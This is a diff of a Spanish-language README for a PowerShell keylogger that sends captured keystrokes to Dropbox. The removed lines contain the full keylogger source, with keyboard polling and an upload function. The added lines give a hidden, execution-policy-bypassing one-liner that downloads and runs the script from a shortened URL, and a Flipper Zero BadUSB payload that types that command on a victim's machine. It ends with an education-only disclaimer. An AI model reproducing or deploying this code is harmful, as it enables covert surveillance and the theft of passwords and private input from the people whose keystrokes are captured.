@@ -1,194 +1,130 @@
+
+---
+
 # PowerShell Keylogger con Subida a Dropbox
 
-Este script de PowerShell está diseñado para capturar pulsaciones de teclas (keylogger) y subir los datos capturados a Dropbox. También incluye una funcionalidad para detener su ejecución al detectar un archivo de señalización (`stop.txt`) en la carpeta temporal del usuario.
+Este script está diseñado para capturar las pulsaciones de teclas (keylogger) y subir los datos capturados a Dropbox. Además, incluye una funcionalidad para detener la ejecución automáticamente cuando se detecta un archivo de señalización (`stop.txt`) en la carpeta temporal del usuario.
 
 ## Características
 
-- **Captura de Pulsaciones de Teclas:** Monitorea continuamente las pulsaciones de teclas y captura caracteres legibles, incluyendo teclas especiales como `[BKSP]` (Backspace), `[ENT]` (Enter) y `[ESC]` (Escape).
-- **Subida a Dropbox:** Sube los datos capturados a Dropbox utilizando un token de acceso proporcionado dinámicamente.
-- **Detección y Detención Basada en Archivo de Señalización:** El script se detiene automáticamente al detectar un archivo `stop.txt` en la carpeta temporal del usuario.
-- **Ejecución Oculta:** El script se puede ejecutar en segundo plano sin mostrar una ventana de PowerShell.
+- **Captura de Pulsaciones de Teclas**: Monitorea las pulsaciones de teclas y captura caracteres legibles, incluyendo teclas especiales como `[BKSP]`, `[ENT]` y `[ESC]`.
+- **Subida a Dropbox**: Sube los datos a Dropbox utilizando un token de acceso proporcionado dinámicamente.
+- **Detección y Detención Automática**: El script se detiene automáticamente cuando se detecta un archivo `stop.txt` en la carpeta temporal del usuario.
+- **Ejecución Oculta**: El script se ejecuta en segundo plano sin mostrar una ventana de PowerShell.
+- **Ejecución desde Flipper Zero**: Puedes ejecutar el script directamente desde Flipper Zero para facilitar su uso en entornos físicos.
 
 ## Requisitos
 
-- PowerShell
-- Una cuenta de Dropbox
-- Token de acceso de Dropbox
+- **PowerShell 5.0 o superior**
+- **Una cuenta de Dropbox**
+- **Token de acceso de Dropbox**
 
 ## Instalación
 
-1. **Clona el Repositorio:**
+### Método 1: Ejecutar en PowerShell
 
-    ```bash
-    git clone https://github.com/tu-usuario/nombre-repositorio.git
-    cd nombre-repositorio
-    ```
+1. **Clona el Repositorio**:
 
-2. **Guarda el Script:**
+   ```bash
+   https://github.com/dolaraso/flipper-atack.git
+   cd flipper-atack.git
+   ```
 
-   Guarda el siguiente script como `keylogger.ps1`:
+2. **Guardar el Script**:
 
-    ```powershell
-    <#
-    ########################################################################################################################
-    #    _______     ______  ______ _____  ______ _      _____ _____  _____  ______ _____   _____ 			      # 
-    #   / ____\ \   / /  _ \|  ____|  __ \|  ____| |    |_   _|  __ \|  __ \|  ____|  __ \ / ____|                        # 
-    #  | |     \ \_/ /| |_) | |__  | |__) | |__  | |      | | | |__) | |__) | |__  | |__) | (___                          # 
-    #  | |      \   / |  _ <|  __| |  _  /|  __| | |      | | |  ___/|  ___/|  __| |  _  / \___ \                         # 
-    #  | |____   | |  | |_) | |____| | \ \| |    | |____ _| |_| |    | |    | |____| | \ \ ____) |                        # 
-    #   \_____|  |_|  |____/|______|_|  \_\_|    |______|_____|_|    |_|    |______|_|  \_\_____/ 			      # 
-    #########################################################################################################################           
-    #>
+   Guarda el script proporcionado como `keylogger.ps1` en tu máquina.
 
-    # Introduce tu token de acceso a continuación. 
+3. **Configura el Token de Dropbox**:
 
-    # $db = ""  # El token de acceso de Dropbox será proporcionado dinámicamente
+   Asegúrate de colocar tu token de acceso de Dropbox en el siguiente fragmento del script:
 
-    # Función para subir datos a Dropbox
-    function Upload-ToDropbox {
-        param (
-            [string]$fileContent,
-            [string]$fileName,
-            [string]$dropboxAccessToken
-        )
+   ```powershell
+   $db = "TU_TOKEN_DE_ACCESSO_DROPBOX"  # Reemplaza con tu token de acceso real
+   ```
 
-        $dropboxUploadUrl = "https://content.dropboxapi.com/2/files/upload"
-        $dropboxArgs = @{
-            "Authorization" = "Bearer $dropboxAccessToken"
-            "Content-Type"  = "application/octet-stream"
-            "Dropbox-API-Arg" = (@{
-                "path" = "/$fileName"
-                "mode" = "add"
-                "autorename" = $true
-                "mute" = $false
-                "strict_conflict" = $false
-            } | ConvertTo-Json -Compress)
-        }
+4. **Ejecutar el Script**:
 
-        try {
-            Invoke-RestMethod -Uri $dropboxUploadUrl -Method Post -Headers $dropboxArgs -Body ([System.Text.Encoding]::UTF8.GetBytes($fileContent))
-            Write-Host "Archivo subido correctamente a Dropbox."
-        } catch {
-            Write-Host "Error al subir el archivo a Dropbox: $_"
-        }
-    }
+   Ejecuta el siguiente comando en PowerShell para iniciar el script:
 
-    # Importar definiciones de DLL para entradas de teclado
-    $API = @'
-    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
-    public static extern short GetAsyncKeyState(int virtualKeyCode); 
-    [DllImport("user32.dll", CharSet=CharSet.Auto)]
-    public static extern int GetKeyboardState(byte[] keystate);
-    [DllImport("user32.dll", CharSet=CharSet.Auto)]
-    public static extern int MapVirtualKey(uint uCode, int uMapType);
-    [DllImport("user32.dll", CharSet=CharSet.Auto)]
-    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
-    '@
-    $API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
+   ```powershell
+   powershell -w h -NoP -Ep Bypass $db='TU_TOKEN_DE_ACCESSO_DROPBOX';irm https://n9.cl/mrflipper5 | iex
+   ```
 
-    # Añadir cronómetro para enviar inteligentemente
-    $LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
-    $KeypressThreshold = [TimeSpan]::FromSeconds(10)
+   Este comando ejecutará el script en segundo plano (`-w h`), desactivando restricciones de política de ejecución (`-NoP -Ep Bypass`), y cargará el script desde la URL proporcionada, utilizando el token de Dropbox que especificaste.
 
-    # Marca para el inicio del archivo y antes de los resultados
-    $marca = @'
-    <#
-    ########################################################################################################################
-    #    _______     ______  ______ _____  ______ _      _____ _____  _____  ______ _____   _____ 			      # 
-    #   / ____\ \   / /  _ \|  ____|  __ \|  ____| |    |_   _|  __ \|  __ \|  ____|  __ \ / ____|                        # 
-    #  | |     \ \_/ /| |_) | |__  | |__) | |__  | |      | | | |__) | |__) | |__  | |__) | (___                          # 
-    #  | |      \   / |  _ <|  __| |  _  /|  __| | |      | | |  ___/|  ___/|  __| |  _  / \___ \                         # 
-    #  | |____   | |  | |_) | |____| | \ \| |    | |____ _| |_| |    | |    | |____| | \ \ ____) |                        # 
-    #   \_____|  |_|  |____/|______|_|  \_\_|    |______|_____|_|    |_|    |______|_|  \_\_____/ 			      # 
-    #########################################################################################################################           
-    #>
-    '@
+### Método 2: Ejecutar desde Flipper Zero
 
-    # Archivo de señal para detener el script
-    $stopSignalFile = "$env:TEMP\stop.txt"
+1. **Cargar el Script en Flipper Zero**:
 
-    # Iniciar un bucle continuo
-    While ($true) {
-        # Verificar si existe el archivo de señalización para detener el script
-        if (Test-Path $stopSignalFile) {
-            Write-Host "Archivo de señalización detectado. Deteniendo el script."
-            Remove-Item $stopSignalFile -Force
-            exit
-        }
+   Utiliza el siguiente script en Flipper Zero para ejecutar el keylogger directamente desde el dispositivo:
 
-        $keyPressed = $false
-        try {
-            # Iniciar un bucle que verifica el tiempo desde la última actividad antes de enviar el mensaje
-            while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
-                # Iniciar el bucle con un retraso de 30 ms entre cada verificación del estado del teclado
-                Start-Sleep -Milliseconds 30
-                for ($asc = 8; $asc -le 254; $asc++) {
-                    # Obtener el estado de la tecla (si alguna tecla está actualmente presionada)
-                    $keyst = $API::GetAsyncKeyState($asc)
-                    # Si se presiona una tecla
-                    if ($keyst -eq -32767) {
-                        # Reiniciar el temporizador de inactividad
-                        $keyPressed = $true
-                        $LastKeypressTime.Restart()
-                        $null = [console]::CapsLock
-                        # Traducir el código de tecla a una letra
-                        $vtkey = $API::MapVirtualKey($asc, 3)
-                        # Obtener el estado del teclado y crear un StringBuilder
-                        $kbst = New-Object Byte[] 256
-                        $checkkbst = $API::GetKeyboardState($kbst)
-                        $logchar = New-Object -TypeName System.Text.StringBuilder
-                        # Definir la tecla que se presionó          
-                        if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
-                            # Verificar teclas no alfanuméricas
-                            $LString = $logchar.ToString()
-                            if ($asc -eq 8) {$LString = "[BKSP]"}
-                            if ($asc -eq 13) {$LString = "[ENT]"}
-                            if ($asc -eq 27) {$LString = "[ESC]"}
-                            # Añadir la tecla a la variable de envío
-                            $send += $LString 
-                        }
-                    }
-                }
-            }
-        }
-        finally {
-            if ($keyPressed) {
-                # Enviar las teclas guardadas a Dropbox con la marca al inicio
-                $timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
-                $fileName = "keystrokes_$timestamp.txt"
-                $fileContent = "$marca`n$send"
-                Upload-ToDropbox -fileContent $fileContent -fileName $fileName -dropboxAccessToken $db
+   ```flipper
+   REM     Title: Keylogger Dropbox
+   REM     Author: mr.flippermen
+   REM     Description: Este script está diseñado para capturar pulsaciones de teclas (keylogger) y subir los datos capturados a Dropbox
+   REM     Target: Windows 10, 11
 
-                # Limpiar el archivo de registro y reiniciar la verificación de inactividad
-                $send = ""
-                $keyPressed = $false
-            }
-        }
-        # Reiniciar el cronómetro antes de reiniciar el bucle
-        $LastKeypressTime.Restart()
-        Start-Sleep -Milliseconds 10
-    }
-    ```
+   GUI r
+   DELAY 500
+   STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';irm https://n9.cl/mrflipper5 | iex
+   ENTER
+   ```
 
-## Ejecución
+   Este código abrirá PowerShell, configurará los parámetros necesarios y ejecutará el script desde una URL externa.
 
-Para ejecutar el script, utiliza el siguiente comando en el diálogo de "Ejecutar" (Windows + R):
+## Detener la Ejecución del Script
+
+Para detener el script de manera segura, simplemente crea un archivo `stop.txt` en la carpeta temporal del usuario. El script verificará la existencia de este archivo y se detendrá si lo encuentra.
+
+### Crear el archivo `stop.txt`:
+
+Para crear el archivo `stop.txt`, usa el siguiente comando en PowerShell:
 
 ```powershell
-powershell -w h -NoP -Ep Bypass $db='TU_TOKEN_DE_ACCESSO_DROPBOX';irm https://goo.su/xMXEjC | iex
-Asegúrate de reemplazar TU_TOKEN_DE_ACCESSO_DROPBOX con tu token de acceso real de Dropbox.
-
- Este comando ejecutará el script de manera oculta (-w h), sin restricciones de política de ejecución (-NoP -Ep Bypass), y cargará el script desde la URL proporcionada, ejecutándolo con el token de acceso de Dropbox que especificaste.
-
-## Detener la ejecución del script
-Para detener la ejecución del script, crea un archivo llamado stop.txt en la carpeta temporal ($env:TEMP) del usuario. El script comprobará la existencia de este archivo y se detendrá si lo encuentra.
-
-Puedes crear este archivo usando PowerShell con el siguiente comando:
-## COMANDO PARA CREAR EL ARCHIVO 
 New-Item -Path "$env:TEMP\stop.txt" -ItemType File
-## COMANDO PARA ELIMINAR EL ARCHIVO
+```
+
+### Eliminar el archivo `stop.txt`:
+
+Si deseas eliminar el archivo de señalización y reiniciar el script, usa este comando:
+
+```powershell
 Remove-Item -Path "$env:TEMP\stop.txt" -Force
-Contribución
+```
 
-Las contribuciones son bienvenidas. Por favor, realiza un fork del repositorio y envía un pull request con tus mejoras.
+## Detalles del Script
 
+### Keylogger
+
+Este script realiza los siguientes pasos:
+
+1. Captura las pulsaciones de teclas del sistema, incluyendo teclas especiales como `[BKSP]`, `[ENT]`, y `[ESC]`.
+2. Almacena los datos capturados en una variable.
+3. Envia los datos a Dropbox con un nombre de archivo basado en la fecha y hora actual.
+4. Monitorea la carpeta temporal del usuario y se detiene automáticamente si encuentra un archivo `stop.txt`.
+
+### Dropbox-Upload
+
+Esta función realiza los siguientes pasos:
+
+1. Toma el contenido de las pulsaciones de teclas como parámetro.
+2. Define los encabezados y parámetros necesarios para la solicitud a la API de Dropbox.
+3. Usa `Invoke-RestMethod` para subir los datos a Dropbox.
+
+## Notas
+
+- Asegúrate de tener suficiente espacio en tu cuenta de Dropbox para almacenar los datos subidos.
+- El script debe ejecutarse con permisos de administrador para capturar las pulsaciones de teclas.
+- Recuerda que el script puede ejecutarse también desde un Flipper Zero, lo que facilita su uso en entornos controlados o pruebas de penetración.
+
+## Licencia
+
+Este proyecto está licenciado bajo los términos de la licencia MIT. Consulta el archivo `LICENSE` para más detalles.
+
+---
+
+🚨 **Descargo de Responsabilidad:**
+
+El uso de este repositorio y los scripts contenidos en él es responsabilidad exclusiva del usuario. El autor de este proyecto no se hace responsable de cualquier daño, perjuicio o actividad ilegal que resulte del uso de estos scripts en entornos no autorizados o no controlados. Este proyecto debe ser utilizado únicamente con fines educativos y en entornos de pruebas con permisos explícitos. El uso indebido de este código puede estar sujeto a acciones legales. El usuario es responsable de cumplir con todas las leyes locales y regulaciones aplicables.
+
+---
